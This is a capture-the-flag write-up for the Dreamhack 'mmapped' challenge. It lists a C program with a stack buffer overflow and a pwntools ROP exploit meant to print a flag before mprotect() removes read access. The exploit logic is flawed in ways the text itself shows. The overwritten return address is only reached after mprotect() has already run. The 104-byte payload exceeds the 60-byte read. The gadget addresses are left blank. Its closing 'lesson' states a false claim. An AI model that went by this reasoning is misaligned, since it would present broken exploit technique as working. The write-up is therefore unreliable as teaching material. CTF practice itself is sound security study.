---
title: "[Dreamhack] mmapped - Stack Overflow to Leak mmap'd Flag"
date: 2024-01-17 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, mmap, mprotect, stack-overflow, dreamhack, memory-protection]
author: datious
description: "Dreamhack writeup: mmapped — dùng stack buffer overflow để ghi đè save RIP trước khi mprotect() khóa vùng nhớ chứa flag thực."
---

# [Write up for Dreamhack] Challenge: mmapped
**Author: datious**

Today I will solve a challenge related to **memory protection**.

## Source Code

```c
// Name: chall.c
// Compile: gcc -fno-stack-protector chall.c -o chall

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#define FLAG_SIZE 0x45

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

int main(int argc, char *argv[]) {
    int len;
    char * fake_flag_addr;
    char buf[0x20];
    int fd;
    char * real_flag_addr;

    initialize();

    fd = open("./flag", O_RDONLY);
    len = FLAG_SIZE;
    fake_flag_addr = "DH{****************************************************************}";

    printf("fake flag address: %p\n", fake_flag_addr);
    printf("buf address: %p\n", buf);

    real_flag_addr = (char *)mmap(NULL, FLAG_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    printf("real flag address (mmapped address): %p\n", real_flag_addr);

    printf("%s", "input: ");
    read(0, buf, 60);              // ← buf is 0x20=32 bytes, reads 60 → Overflow!

    mprotect(real_flag_addr, len, PROT_NONE);   // ← removes read permission!

    write(1, fake_flag_addr, FLAG_SIZE);
    printf("\nbuf value: ");
    puts(buf);

    munmap(real_flag_addr, FLAG_SIZE);
    close(fd);
    return 0;
}
```

## Analysis

The program provides 3 addresses:
- `fake_flag_addr` (read-only, .rodata): fake flag string
- `buf` (stack): user input buffer
- `real_flag_addr` (mmap'd): actual flag content

**The flow:**
1. `mmap()` maps the flag file into memory with `PROT_READ`
2. User input via `read(0, buf, 60)` — **buffer overflow** (buf = 32 bytes)
3. `mprotect(real_flag_addr, len, PROT_NONE)` — **removes read permission from flag!**
4. Writes `fake_flag_addr` to stdout (the fake flag)

**Vulnerability:** `read(0, buf, 60)` into a 32-byte `buf` → **stack-based buffer overflow**.

## Strategy

We need to read the flag **before** `mprotect()` removes access. But control flow goes straight to `mprotect()` after input.

**Key insight:** With the overflow, we can overwrite **save RIP** and redirect execution before or instead of `mprotect()`.

We want to print `real_flag_addr`. But since we know it (the program prints it), we can craft a ROP chain:

```
write(1, real_flag_addr, FLAG_SIZE)
```

Instead of calling `mprotect()`, we skip to our write call.

```python
from pwn import *

p = process('./chall')
# or: p = remote(...)

# Parse leaked addresses
p.recvuntil("fake flag address: ")
fake_addr = int(p.recvline().strip(), 16)

p.recvuntil("buf address: ")
buf_addr = int(p.recvline().strip(), 16)

p.recvuntil("real flag address (mmapped address): ")
real_addr = int(p.recvline().strip(), 16)

log.info(f"fake  = {hex(fake_addr)}")
log.info(f"buf   = {hex(buf_addr)}")
log.info(f"real  = {hex(real_addr)}")

elf = ELF('./chall')

# ROP gadgets (no PIE so fixed addresses)
pop_rdi = ...   # find with: ROPgadget --binary chall | grep "pop rdi"
pop_rsi = ...   # pop rsi; pop r15; ret  or similar
pop_rdx = ...   # pop rdx; ret

# write(1, real_addr, 0x45)
payload  = b'A' * 40     # 32 (buf) + 8 (saved rbp) = 40 offset to RIP
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(real_addr) + p64(0)
payload += p64(pop_rdx) + p64(0x45)
payload += p64(elf.plt['write'])

p.sendafter("input: ", payload)
flag = p.recv(0x45)
log.success(f"Flag: {flag}")
```

> **Lesson:** `mprotect()` is often used as a defense, but if you can control the RIP **before** it's called, you can bypass it entirely.
